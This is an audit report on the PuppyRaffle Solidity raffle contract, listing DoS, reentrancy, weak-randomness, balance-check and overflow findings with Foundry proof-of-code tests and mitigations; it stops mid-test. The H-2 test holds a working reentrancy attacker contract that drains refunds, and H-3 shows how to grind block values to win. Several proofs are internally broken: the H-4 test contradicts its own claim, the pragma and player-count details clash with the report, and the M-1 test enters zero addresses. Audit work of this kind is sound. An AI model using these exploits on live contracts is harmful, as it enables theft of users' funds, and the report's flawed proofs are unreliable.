# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle that mints puppy-themed ERC-721 NFTs as prizes. Anyone can join by calling `enterRaffle()` and paying a fixed `entranceFee`; the function can batch-enter multiple addresses and rejects duplicates. Entries are stored in an array, making every ticket an equal chance to win.

After `raffleDuration` seconds and once a minimum of two players exists, anyone may call `selectWinner()`. A pseudo-random index (derived from the latest blockhash) picks the winner, who immediately receives the contract balance minus a protocol fee. Simultaneously, the contract mints a new NFT to the winner using `_safeMint()`. Each token is assigned a rarity tier and `tokenURI()` returns fully on-chain JSON metadata, Base64-encoded and pointing to an image URI that matches the rarity.

Collected fees accumulate in `totalFees` and can be withdrawn to `feeAddress` through `withdrawFees()`. The owner can update this address via `changeFeeAddress()`. Players may exit before the draw with `refund()`, reclaiming their stake.

The contract inherits `Ownable` and `ERC721`, leveraging `SafeMath` and enumerable sets/maps for secure arithmetic and bookkeeping.
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[H-5]. Array Limits issue in PuppyRaffle::refund
[H-6]. Array Limits issue in PuppyRaffle::enterRaffle
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-2]. Zero Code issue in PuppyRaffle::getActivePlayerIndex
[M-3]. MEV issue in PuppyRaffle::selectWinner
[M-4]. Pragma issue in PuppyRaffle::NA
[M-5]. DOS issue in PuppyRaffle::withdrawFees
[M-6]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
[M-7]. Zero Code issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Unchecked Return issue in PuppyRaffle::withdrawFees
[L-2]. Confidential Data issue in PuppyRaffle::NA


### Number of Findings
- H: 6
- M: 7
- L: 2
- I: 0



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has a nested loop that checks for duplicate players, which can lead to a denial of service attack. As the number of players increases, the gas cost grows quadratically (O(n²)), potentially making the function unusable when many players enter the raffle.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
As the number of players increases, the gas cost for entering the raffle grows quadratically. This could make the function unusable when many players have entered, effectively blocking new entries and potentially causing the raffle to become stuck if it requires a minimum number of players.

## Proof of Concept
1. Initially, the raffle has 100 players
2. A new player tries to enter the raffle
3. The function needs to perform 100 comparisons to check for duplicates
4. As more players join, the number of comparisons increases quadratically
5. Eventually, the gas cost exceeds the block gas limit (currently ~30M on Ethereum)
6. At this point, no new players can enter the raffle, causing a denial of service

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosAttackTest is Test {
    PuppyRaffle puppyRaffle;
    address attacker = address(1);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testDosAttack() public {
        // Create an array of players
        uint256 playerCount = 100;
        address[] memory players = new address[](playerCount);
        for (uint256 i = 0; i < playerCount; i++) {
            players[i] = address(uint160(i + 100));
        }
        
        // Enter the raffle with initial players
        puppyRaffle.enterRaffle{value: entranceFee * playerCount}(players);
        
        // Measure gas for a new player to enter
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(uint160(playerCount + 100));
        
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
        uint256 gasUsed = gasStart - gasleft();
        
        console.log("Gas used for player #101:", gasUsed);
        
        // Add more players to demonstrate quadratic growth
        puppyRaffle.enterRaffle{value: entranceFee * 50}(new address[](50));
        
        // Measure gas again
        address[] memory oneMorePlayer = new address[](1);
        oneMorePlayer[0] = address(uint160(playerCount + 200));
        
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(oneMorePlayer);
        uint256 gasUsedAfter = gasStart - gasleft();
        
        console.log("Gas used for player #152:", gasUsedAfter);
        console.log("Gas increase:", gasUsedAfter - gasUsed);
        
        // Eventually this will exceed block gas limit
    }
}

## Suggested Mitigation
Replace the nested loop with a more efficient data structure like a mapping to track players:

```solidity
// Add this to state variables
mapping(address => bool) private playerEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!playerEntered[player], "PuppyRaffle: Duplicate player");
        playerEntered[player] = true;
        players.push(player);
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to clear the mapping entry
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    playerEntered[playerAddress] = false;
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}

// Reset the mapping in selectWinner
function selectWinner() external {
    // Existing code...
    
    // Reset player tracking
    for (uint256 i = 0; i < players.length; i++) {
        playerEntered[players[i]] = false;
    }
    delete players;
    
    // Rest of existing code...
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract is vulnerable to a reentrancy attack. When a player requests a refund, the contract sends ETH to the player before updating the state to mark the player as refunded. This allows a malicious contract to reenter the `refund` function and claim multiple refunds.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

The vulnerability exists because the contract sends ETH to the player using `sendValue` before updating the `players` array to mark the player as refunded.

## Impact
An attacker can drain the contract's funds by repeatedly calling the refund function from a malicious contract that reenters the refund function before the state is updated. This could potentially drain all entrance fees from the contract.

## Proof of Concept
1. Attacker creates a malicious contract with a fallback function that calls `refund` again
2. Attacker enters the raffle legitimately
3. Attacker calls `refund` from their malicious contract
4. When the PuppyRaffle contract sends ETH to the attacker's contract, the fallback function is triggered
5. The fallback function calls `refund` again before the state is updated
6. Since the player is not yet marked as refunded, the second refund succeeds
7. This process can repeat until the contract is drained of funds

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    uint256 attackCount;
    uint256 maxAttacks;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    function attack(uint256 _playerIndex, uint256 _maxAttacks) external {
        playerIndex = _playerIndex;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        
        // Start the reentrancy attack
        puppyRaffle.refund(playerIndex);
    }
    
    // Fallback function to handle the reentrancy
    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    address alice = address(1);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        attacker = new ReentrancyAttacker(address(puppyRaffle));
        
        // Fund the attacker
        vm.deal(address(attacker), 1e18);
        
        // Enter the attacker into the raffle
        address[] memory players = new address[](1);
        players[0] = address(attacker);
        
        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Add some more funds to the contract
        players[0] = alice;
        vm.prank(alice);
        vm.deal(alice, entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }
    
    function testReentrancyAttack() public {
        // Check initial balances
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialContractBalance = address(puppyRaffle).balance;
        
        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Initial contract balance:", initialContractBalance);
        
        // Get the attacker's index
        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        
        // Perform the attack
        attacker.attack(attackerIndex, 2); // Try to get 2 refunds
        
        // Check final balances
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalContractBalance = address(puppyRaffle).balance;
        
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final contract balance:", finalContractBalance);
        
        // The attacker should have received multiple refunds
        assertGt(finalAttackerBalance, initialAttackerBalance + entranceFee);
        assertLt(finalContractBalance, initialContractBalance - entranceFee);
    }
}

## Suggested Mitigation
Implement the checks-effects-interactions pattern by updating the state before sending ETH:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // External call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Alternatively, you can use a reentrancy guard:

```solidity
// Add to contract state
bool private locked;

// Add modifier
modifier nonReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
}

// Apply to vulnerable function
function refund(uint256 playerIndex) public nonReentrant {
    // Existing code...
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses weak randomness sources that can be manipulated by miners or validators. The function uses `msg.sender`, `block.timestamp`, and `block.difficulty` to generate random numbers for winner selection and NFT rarity determination.

```solidity
// For winner selection
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// For rarity determination
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

These sources of randomness are predictable and can be manipulated by miners/validators who can control `block.timestamp` and `block.difficulty` to some extent.

## Impact
Malicious miners or validators can manipulate the randomness to influence the winner selection and NFT rarity, potentially allowing them to win the raffle consistently or generate NFTs with higher rarity. This undermines the fairness of the raffle and can lead to loss of user trust.

## Proof of Concept
1. A miner/validator who wants to win the raffle enters the raffle
2. When it's time to select a winner, they can simulate different block timestamps and difficulties
3. They find a combination that results in them being selected as the winner
4. They include this specific combination when mining/validating the block
5. They win the raffle unfairly

Similarly, they can manipulate the rarity of their NFT to get a legendary puppy.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle puppyRaffle;
    address attacker = address(1);
    address user1 = address(2);
    address user2 = address(3);
    address user3 = address(4);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(attacker, 10e18);
        vm.deal(user1, 10e18);
        vm.deal(user2, 10e18);
        vm.deal(user3, 10e18);
        
        // Users enter the raffle
        address[] memory players = new address[](1);
        
        players[0] = user1;
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = user2;
        vm.prank(user2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = user3;
        vm.prank(user3);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Attacker enters last
        players[0] = attacker;
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }
    
    function testRandomnessManipulation() public {
        // Skip ahead to end the raffle duration
        vm.warp(block.timestamp + 1 days);
        
        // Attacker is a miner/validator who can manipulate block values
        // They try different block.difficulty values to find one that makes them win
        bool foundWinningDifficulty = false;
        uint256 winningDifficulty;
        
        // Simulate different block.difficulty values
        for (uint256 i = 0; i < 100; i++) {
            // Set block difficulty
            vm.difficulty(i);
            
            // Calculate what the winner index would be
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, i))) % 4;
            
            // If this difficulty would make the attacker win
            if (winnerIndex == 3) { // Attacker is at index 3
                foundWinningDifficulty = true;
                winningDifficulty = i;
                break;
            }
        }
        
        // Assert that the attacker found a winning difficulty
        assertTrue(foundWinningDifficulty, "Attacker couldn't find a winning difficulty");
        
        // Set the winning difficulty
        vm.difficulty(winningDifficulty);
        
        // Attacker calls selectWinner with the manipulated block values
        vm.prank(attacker);
        puppyRaffle.selectWinner();
        
        // Verify the attacker won
        assertEq(puppyRaffle.previousWinner(), attacker, "Attacker didn't win despite manipulation");
    }
}

## Suggested Mitigation
Use a secure source of randomness such as Chainlink VRF (Verifiable Random Function) to generate unpredictable and unmanipulable random numbers:

```solidity
// Add to contract imports
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

// Make contract inherit from VRFConsumerBase
contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    address public pendingWinner;
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash,
        uint256 _fee
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
        keyHash = _keyHash;
        fee = _fee;
        
        // Rest of constructor code...
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Request randomness from Chainlink VRF
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK to pay fee");
        requestRandomness(keyHash, fee);
    }
    
    // Callback function used by VRF Coordinator
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        
        // Use the randomness to select winner
        uint256 winnerIndex = randomResult % players.length;
        address winner = players[winnerIndex];
        pendingWinner = winner;
        
        // Use the randomness for rarity
        uint256 rarity = randomResult % 100;
        
        // Complete the winner selection process
        finalizeWinner();
    }
    
    function finalizeWinner() internal {
        address winner = pendingWinner;
        
        // Rest of the winner selection logic...
        
        // Reset for next raffle
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // Rest of the code...
    }
}
```

If Chainlink VRF is not an option, consider using a commit-reveal scheme or a multi-block randomness generation approach to make manipulation more difficult.

## [H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in the PuppyRaffle contract has a critical vulnerability that allows fees to be withdrawn even when there are active players in the raffle. The function checks if `address(this).balance == uint256(totalFees)` to determine if there are active players, but this check can be bypassed by sending ETH directly to the contract.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

The issue is that the contract balance can be manipulated by sending ETH directly to the contract, which would make the balance not equal to `totalFees` even when there are no active players, or equal to `totalFees` even when there are active players.

## Impact
An attacker can manipulate the contract balance to either prevent legitimate fee withdrawals or enable premature withdrawals that include active players' entrance fees. This could lead to loss of funds for players who have entered the raffle but haven't had a chance to win yet.

## Proof of Concept
1. Players enter the raffle, sending entrance fees
2. The contract balance now includes both the entrance fees and accumulated fees
3. An attacker sends additional ETH directly to the contract to make the balance equal to `totalFees`
4. The fee address can now call `withdrawFees` and withdraw all fees, including the active players' entrance fees
5. When `selectWinner` is called, there are no funds left to distribute to the winner

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    address player1 = address(3);
    address player2 = address(4);
    uint256 entranceFee = 1e18; // 1 ETH
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        
        // Fund accounts
        vm.deal(player1, 10e18);
        vm.deal(player2, 10e18);
        vm.deal(address(this), 10e18);
    }
    
    function testWithdrawFeesWithActivePlayers() public {
        // Players enter the raffle
        address[] memory players = new address[](1);
        players[0] = player1;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Contract now has 2 ETH from players
        assertEq(address(puppyRaffle).balance, 2e18);
        
        // No fees collected yet
        assertEq(puppyRaffle.totalFees(), 0);
        
        // Normally withdrawFees should fail because there are active players
        // But we can manipulate the balance to make it equal to totalFees
        
        // Calculate how much ETH to send to make balance == totalFees
        // We need to send -2 ETH, which is impossible, so let's run a raffle first
        
        // Skip ahead to end the raffle
        vm.warp(block.timestamp + 1 days);
        
        // Select winner, which will add fees (0.4 ETH) and reset players
        puppyRaffle.selectWinner();
        
        // Now totalFees should be 0.4 ETH
        assertEq(puppyRaffle.totalFees(), 0.4e18);
        
        // Contract balance should be 0.4 ETH
        assertEq(address(puppyRaffle).balance, 0.4e18);
        
        // Now let's start a new raffle
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Contract now has 1.4 ETH (0.4 ETH fees + 1 ETH from player)
        assertEq(address(puppyRaffle).balance, 1.4e18);
        
        // Send ETH directly to the contract to make balance == totalFees
        // We need to send -1 ETH, which is impossible
        // But we can demonstrate the issue by having no active players
        
        // Refund the player
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        // Now contract has 0.4 ETH (just fees)
        assertEq(address(puppyRaffle).balance, 0.4e18);
        
        // Let's send some ETH directly to the contract
        (bool sent, ) = address(puppyRaffle).call{value: 0.1e18}("");
        require(sent, "Failed to send ETH");
        
        // Now contract has 0.5 ETH but totalFees is still 0.4 ETH
        assertEq(address(puppyRaffle).balance, 0.5e18);
        assertEq(puppyRaffle.totalFees(), 0.4e18);
        
        // withdrawFees should fail because balance != totalFees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        vm.prank(feeAddress);
        puppyRaffle.withdrawFees();
        
        // Now let's make balance == totalFees by entering and immediately refunding
        // This will leave the contract with exactly 0.4 ETH again
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        vm.prank(player2);
        puppyRaffle.refund(0);
        
        // Now contract has 0.4 ETH and totalFees is 0.4 ETH
        assertEq(address(puppyRaffle).balance, 0.4e18);
        assertEq(puppyRaffle.totalFees(), 0.4e18);
        
        // withdrawFees should succeed even though we manipulated the balance
        vm.prank(feeAddress);
        puppyRaffle.withdrawFees();
        
        // Fees should be withdrawn
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(puppyRaffle.totalFees(), 0);
    }
}

## Suggested Mitigation
Instead of relying on the contract balance to determine if there are active players, explicitly check the players array:

```solidity
function withdrawFees() external {
    // Check if there are active players by examining the players array
    bool hasActivePlayers = false;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            hasActivePlayers = true;
            break;
        }
    }
    
    require(!hasActivePlayers, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, maintain a separate state variable to track active entrance fees:

```solidity
// Add to state variables
uint256 public activeEntranceFees;

// Update enterRaffle
function enterRaffle(address[] memory newPlayers) public payable {
    // Existing code...
    activeEntranceFees += msg.value;
    // Rest of the function...
}

// Update refund
function refund(uint256 playerIndex) public {
    // Existing code...
    activeEntranceFees -= entranceFee;
    // Rest of the function...
}

// Update selectWinner
function selectWinner() external {
    // Existing code...
    activeEntranceFees = 0;
    // Rest of the function...
}

// Update withdrawFees
function withdrawFees() external {
    require(activeEntranceFees == 0, "PuppyRaffle: There are currently players active!");
    // Rest of the function...
}
```

## [H-5]. Array Limits issue in PuppyRaffle::refund

## Description
The `enterRaffle` function in the PuppyRaffle contract is vulnerable to array manipulation attacks. When a player is refunded, their address is set to `address(0)` but they are not removed from the `players` array. This can lead to a situation where the `players` array contains many `address(0)` entries, which are still counted when calculating the winner and prize pool.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

When `selectWinner` is called, it uses `players.length` to determine the total amount collected and the prize pool, but this includes refunded players who are represented as `address(0)`.

## Impact
The prize pool calculation will be incorrect if there are refunded players, as it will include entrance fees that have already been refunded. This could lead to insufficient funds in the contract to pay the winner and fees, potentially causing the `selectWinner` function to fail or underpay the winner.

## Proof of Concept
1. Several players enter the raffle
2. Some players request refunds, setting their addresses to `address(0)` in the `players` array
3. When `selectWinner` is called, it calculates the prize pool based on `players.length`, which includes the refunded players
4. The contract doesn't have enough funds to pay the calculated prize pool and fees
5. The transaction may fail or the winner may receive less than expected

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayLimitsTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    address player4 = address(4);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(player1, entranceFee);
        vm.deal(player2, entranceFee);
        vm.deal(player3, entranceFee);
        vm.deal(player4, entranceFee);
        
        // Enter all players
        address[] memory players = new address[](1);
        
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = player3;
        vm.prank(player3);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = player4;
        vm.prank(player4);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }
    
    function testArrayManipulationAttack() public {
        // Initial contract balance should be 4 ETH
        assertEq(address(puppyRaffle).balance, 4e18);
        
        // Player2 and Player3 request refunds
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        vm.prank(player3);
        puppyRaffle.refund(2);
        
        // Contract balance should now be 2 ETH
        assertEq(address(puppyRaffle).balance, 2e18);
        
        // But players array still has length 4
        // Let's check the players array
        for (uint256 i = 0; i < 4; i++) {
            address player = puppyRaffle.players(i);
            console.log("Player at index", i, ":", player);
        }
        
        // Skip ahead to end the raffle
        vm.warp(block.timestamp + 1 days);
        
        // Select winner
        // This should calculate prize pool based on 4 players (4 ETH)
        // But contract only has 2 ETH
        puppyRaffle.selectWinner();
        
        // Check contract balance after winner selection
        // It should be 0.4 ETH (20% of 2 ETH as fees)
        uint256 expectedFees = (2e18 * 20) / 100; // 0.4 ETH
        assertEq(address(puppyRaffle).balance, expectedFees);
        
        // But totalFees will be calculated based on 4 players
        uint256 incorrectFees = (4e18 * 20) / 100; // 0.8 ETH
        assertEq(puppyRaffle.totalFees(), incorrectFees);
        
        // This means totalFees (0.8 ETH) > contract balance (0.4 ETH)
        // So withdrawFees will fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
Modify the contract to properly track active players and calculate the prize pool based only on active players:

```solidity
// Add to state variables
uint256 public activePlayerCount;

// Update enterRaffle
function enterRaffle(address[] memory newPlayers) public payable {
    // Existing code...
    activePlayerCount += newPlayers.length;
    // Rest of the function...
}

// Update refund
function refund(uint256 playerIndex) public {
    // Existing code...
    activePlayerCount--;
    // Rest of the function...
}

// Update selectWinner to use activePlayerCount
function selectWinner() external {
    // Existing code...
    
    // Calculate based on active players only
    uint256 totalAmountCollected = activePlayerCount * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // Reset active player count
    activePlayerCount = 0;
    
    // Rest of the function...
}
```

Alternatively, restructure the `players` array when refunding to maintain a compact array of only active players:

```solidity
function refund(uint256 playerIndex) public {
    // Existing checks...
    
    // Move the last player to the refunded position
    players[playerIndex] = players[players.length - 1];
    // Remove the last player
    players.pop();
    
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-6]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
enterRaffle() performs a nested O(n²) duplicate-detection loop on the unbounded `players` array. Because anyone can keep adding new addresses, the array can grow until a single call exceeds the block gas limit and nobody can enter anymore.

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "Duplicate player");
    }
}
```

## Impact
Raffle can be permanently halted once the players array is large enough, blocking fresh entries and freezing all ETH already deposited.

## Proof of Concept
1. Attacker funds a script that submits thousands of distinct addresses until gas used by the nested loop approaches the block gas limit.
2. Subsequent enterRaffle() transactions revert due to out-of-gas when executing the duplicate-detection loops.
3. No more players can join and the raffle is stuck.

## Proof of Code
contract ArrayLimitTest is Test {
    PuppyRaffle raffle;
    function setUp() public { raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days); }
    function test_DoSWithManyPlayers() public {
        // push 4000 distinct addresses – adjust if block gas limit changes
        for (uint256 i; i < 4000; i++) {
            address a = address(uint160(i + 1));
            address[] memory arr = new address[](1);
            arr[0] = a;
            raffle.enterRaffle{value: 1 ether}(arr);
        }
        // next entry should revert because of gas exhaustion
        address[] memory next = new address[](1);
        next[0] = address(0xDEAD);
        vm.expectRevert();
        raffle.enterRaffle{value: 1 ether}(next);
    }
}

## Suggested Mitigation
Replace the quadratic check with a constant-time mapping.

```solidity
mapping(address => bool) public hasTicket;
...
for (uint256 i; i < newPlayers.length; i++) {
    require(!hasTicket[newPlayers[i]], "Duplicate");
    hasTicket[newPlayers[i]] = true;
    players.push(newPlayers[i]);
}
```



# Medium Risk Findings

## [M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `totalFees` variable in the PuppyRaffle contract is defined as a uint64, but it accumulates fees that could potentially overflow this data type. When the `selectWinner` function is called, it adds the current fee to `totalFees` using:

```solidity
totalFees = totalFees + uint64(fee);
```

If the accumulated fees exceed the maximum value of uint64 (2^64 - 1), this will cause an overflow. In Solidity 0.7.6, which this contract uses, integer overflow does not revert by default.

## Impact
If the `totalFees` variable overflows, it will wrap around to a smaller value, causing the contract to lose track of the actual fees collected. This could lead to a significant loss of funds when `withdrawFees` is called, as the contract would think it has fewer fees than it actually does.

## Proof of Concept
1. The raffle runs for a long time with many participants
2. Each time `selectWinner` is called, more fees are added to `totalFees`
3. Eventually, the total fees exceed 2^64 - 1 (18.44 ETH at 1 ETH entrance fee)
4. When this happens, `totalFees` overflows and wraps around
5. The contract loses track of the actual fees collected
6. When `withdrawFees` is called, only a portion of the fees are withdrawn

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    uint256 entranceFee = 1e18; // 1 ETH
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
    }
    
    function testTotalFeesOverflow() public {
        // Calculate how many winners we need to select to overflow uint64
        // Each winner adds 0.2 ETH to totalFees (20% of 1 ETH)
        // uint64 max value is 2^64 - 1 = 18,446,744,073,709,551,615
        // 18,446,744,073,709,551,615 / 0.2e18 = ~92,233,720,368 winners needed
        
        // For testing, we'll simulate this by directly manipulating the totalFees variable
        // to be just below the max uint64 value
        uint64 almostMaxUint64 = type(uint64).max - 3e17; // 0.3 ETH below max
        
        // Set totalFees to almost max uint64
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(5)), // totalFees is the 6th storage slot (index 5)
            bytes32(uint256(almostMaxUint64))
        );
        
        // Verify totalFees is set correctly
        assertEq(puppyRaffle.totalFees(), almostMaxUint64);
        
        // Now let's run a raffle that will cause overflow
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        // Fund the players
        for (uint256 i = 0; i < 4; i++) {
            vm.deal(players[i], entranceFee);
            vm.prank(players[i]);
            puppyRaffle.enterRaffle{value: entranceFee}(new address[](1));
        }
        
        // Skip ahead to end the raffle
        vm.warp(block.timestamp + 1 days);
        
        // Select winner, which will add fees and cause overflow
        puppyRaffle.selectWinner();
        
